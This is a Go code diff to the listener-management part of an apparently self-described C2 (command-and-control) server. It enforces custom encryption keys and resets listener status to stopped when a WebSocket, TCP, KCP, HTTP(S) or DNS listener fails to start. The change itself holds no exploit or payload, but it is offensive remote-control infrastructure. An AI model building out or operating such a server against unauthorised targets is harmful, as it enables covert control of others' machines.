@@ -69,6 +69,13 @@ func AddListener(c *gin.Context) {
 		}
 	}
 
+	// J4 前置：默认/空密钥的监听器 handleOpenPort 必然拒绝启动。原实现先 Insert(Status:1)
+	// 再 go handleOpenPort，被拒绝后库里会留下 Status=1 却没有句柄的记录（前端显示"监听中"）。
+	if err := encrypt.ValidateListenerKeyConfigForStart(listener.VKey, listener.EncryptionSalt); err != nil {
+		c.JSON(http.StatusOK, gin.H{"status": 400, "data": err.Error()})
+		return
+	}
+
 	database.Engine.Insert(&database.Listener{
 		Type:              listener.Type,
 		ListenAddress:     listener.ListenAddress,
@@ -381,6 +388,18 @@ func registerHTTPRoutes(mux *http.ServeMux, vkey, salt string) {
 	})
 }
 
+// markListenerStartFailed 启动失败时把监听器状态回置为"已停止"。
+// 否则库里会留下 Status=1 却没有句柄的记录：前端显示"监听中"、dashboard 的监听器
+// 计数虚高，而 listenerHandleAlive 探活为 false（只有 RestartListener 会用到探活）。
+// 各启动失败分支（J4 拒绝、端口绑定失败、证书生成失败、HTTP(S) 服务起不来）统一走这里。
+func markListenerStartFailed(listenerType, listenerAddress, reason string) {
+	if database.Engine != nil {
+		database.Engine.Where("listen_address = ?", listenerAddress).Update(&database.Listener{Status: 2})
+		encrypt.InvalidateListenerKeyCache()
+	}
+	logx.Errorf("❌ [监听器] %s://%s 启动失败，状态已回置为已停止：%s\n", listenerType, listenerAddress, reason)
+}
+
 func handleOpenPort(listenerType string, listenerAddress string, vkey string, salt string) {
 	// 崩溃防护：任何监听器 panic 都不能杀死整个 C2 进程
 	defer func() {
@@ -391,12 +410,9 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 
 	// J4: 启动强制——监听器无自定义密钥（默认/空）时拒绝启动
 	// （默认密钥为公开常量：流量可解密、可伪造客户端劫持会话）
-	mk := make([]byte, 32)
-	copy(mk, []byte(vkey))
-	sl := make([]byte, 16)
-	copy(sl, []byte(salt))
-	if vkey == "" || salt == "" || encrypt.IsDefaultListenerKey(mk, sl) {
-		logx.Errorf("🚫 [监听器] 拒绝启动 %s://%s：请先配置自定义 VKey/加密盐（当前为默认/空密钥，公开且可预测）\n", listenerType, listenerAddress)
+	// 与 AddListener 入库前共用 encrypt.ValidateListenerKeyConfigForStart，避免两处判定漂移
+	if err := encrypt.ValidateListenerKeyConfigForStart(vkey, salt); err != nil {
+		markListenerStartFailed(listenerType, listenerAddress, err.Error())
 		return
 	}
 
@@ -423,16 +439,16 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		connection.MuClientListenerType.Unlock()
 		if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
 			// 不用 log.Fatal：单端口 bind 失败不应拖垮整个 C2（其他监听器与已上线客户端）
-			logx.Errorf("❌ [监听器管理] WebSocket 监听 %s 启动失败: %v\n", listenerAddress, err)
 			connection.MuClientListenerType.Lock()
 			delete(connection.HttpServer, listenerAddress)
 			connection.MuClientListenerType.Unlock()
+			markListenerStartFailed(listenerType, listenerAddress, "WebSocket 监听失败: "+err.Error())
 		}
 
 	case "tcp":
 		tcpListener, err := net.Listen("tcp", listenerAddress)
 		if err != nil {
-			logx.Println("Error listening:", err)
+			markListenerStartFailed(listenerType, listenerAddress, "TCP 端口绑定失败: "+err.Error())
 			return
 		}
 		connection.MuClientListenerType.Lock()
@@ -453,7 +469,7 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		lis, err := kcp.ListenWithOptions(listenerAddress, nil, 10, 3)
 		if err != nil {
 			// 不用 log.Fatal：单端口失败不拖垮整个 C2
-			logx.Errorf("❌ [监听器管理] KCP 监听 %s 启动失败: %v\n", listenerAddress, err)
+			markListenerStartFailed(listenerType, listenerAddress, "KCP 端口绑定失败: "+err.Error())
 			return
 		}
 		logx.Println("Server listening on", listenerAddress)
@@ -493,7 +509,12 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		// 启动服务器（非阻塞）
 		go func() {
 			if err := server.ListenAndServe(); err != nil && err != http.ErrServerClosed {
-				logx.Println(err)
+				// 端口被占用等启动失败：句柄已在 map 中，必须摘掉，否则 listenerHandleAlive
+				// 会因句柄存在而误判为运行中（websocket 分支原有此清理，http/https 漏了）
+				connection.MuClientListenerType.Lock()
+				delete(connection.HttpServer, listenerAddress)
+				connection.MuClientListenerType.Unlock()
+				markListenerStartFailed(listenerType, listenerAddress, "HTTP 监听失败: "+err.Error())
 			}
 		}()
 	case "https":
@@ -515,7 +536,7 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 			var err error
 			certFile, keyFile, err = certutil.GenerateSelfSigned(sanHosts, "certs")
 			if err != nil {
-				logx.Errorf("❌ [HTTPS] 生成自签名证书失败: %v，监听器 %s 未启动\n", err, listenerAddress)
+				markListenerStartFailed(listenerType, listenerAddress, "生成自签名证书失败: "+err.Error())
 				return
 			}
 			logx.Infof("🔐 [HTTPS] 未配置证书，已生成自签名证书: %s（生产请配置真实证书）\n", certFile)
@@ -541,7 +562,10 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 		// 启动 TLS 服务器（非阻塞）
 		go func() {
 			if err := server.ListenAndServeTLS(certFile, keyFile); err != nil && err != http.ErrServerClosed {
-				logx.Println(err)
+				connection.MuClientListenerType.Lock()
+				delete(connection.HttpServer, listenerAddress)
+				connection.MuClientListenerType.Unlock()
+				markListenerStartFailed(listenerType, listenerAddress, "HTTPS 监听失败: "+err.Error())
 			}
 		}()
 	case "oss":
@@ -564,6 +588,12 @@ func handleOpenPort(listenerType string, listenerAddress string, vkey string, sa
 			dns_listener.SetDNSLabelPrefix(sanitizeMasquerade(p.DNS.BeaconPrefix))
 		}
 		go dns_listener.HandleDNSConnection(dnsAddr, domain)
+	default:
+		// 正向监听（*_forward）不 bind 本机端口：连接由 /client/forward-connect 按需发起。
+		// 此处不置失败状态——正向记录里 Status 的语义是"是否启用"（见 server.go 自动创建处），
+		// 且 GetListenerHeartbeatConfigByType 要求 status=1 才会用记录里的心跳配置。
+		// 注意 server.go 注释所称"启用后由 handleOpenPort 自动拨号"尚未实现，本分支目前是空操作。
+		logx.Warnf("⚠️ [监听器] %s://%s 无本机监听分支（正向监听不 bind 端口，Status 仅作启用标记，自动拨号未实现）\n", listenerType, listenerAddress)
 	}
 }
 func handleClosePort(listenerType string, listenerAddress string, c *gin.Context) {
